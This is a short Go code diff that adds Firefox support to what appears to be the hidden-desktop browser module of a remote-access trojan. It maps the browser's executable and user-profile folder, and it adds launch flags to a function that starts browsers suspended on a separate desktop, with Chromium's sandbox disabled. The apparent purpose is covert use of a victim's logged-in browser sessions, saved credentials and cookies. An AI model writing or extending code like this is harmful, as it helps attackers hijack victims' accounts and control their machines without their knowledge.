@@ -213,6 +213,15 @@ var browserInfoMap = map[string]browserInfo{
 		},
 		userData: `Microsoft\Edge\User Data`,
 	},
+	"firefox": {
+		name:    "Firefox",
+		exeName: "firefox.exe",
+		exePaths: []string{
+			`\Mozilla Firefox\firefox.exe`,
+		},
+		userData:   `Mozilla\Firefox`,
+		useAppData: true,
+	},
 }
 
 func findBrowserExe(info browserInfo) string {
@@ -709,8 +718,11 @@ func createSuspendedProcessOnDesktop(filePath, searchPath, replacePath, shmName 
 		"brave.exe":  true,
 		"msedge.exe": true,
 	}
-	if browserExes[strings.ToLower(filepath.Base(filePath))] {
+	baseName := strings.ToLower(filepath.Base(filePath))
+	if browserExes[baseName] {
 		args += " --no-sandbox --allow-no-sandbox-job --disable-gpu --start-fullscreen"
+	} else if baseName == "firefox.exe" {
+		args += " -no-remote -wait-for-browser"
 	}
 	cmdLine, err := syscall.UTF16FromString(filePath + args)
 	if err != nil {
